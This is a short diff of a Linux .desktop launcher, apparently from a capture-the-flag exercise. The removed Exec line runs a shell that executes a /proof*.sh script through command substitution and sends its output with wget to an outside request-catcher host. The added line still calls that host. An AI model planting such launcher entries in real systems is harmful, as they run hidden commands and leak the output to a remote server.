@@ -1,3 +1,3 @@
 [Desktop Entry]
-Exec=sh -c "wget https://hkcert.requestcatcher.com/test?`/proof*.sh`"
+Exec=sh -c "wget https://hkcert.requestcatcher.com/test?"
 Type=Application
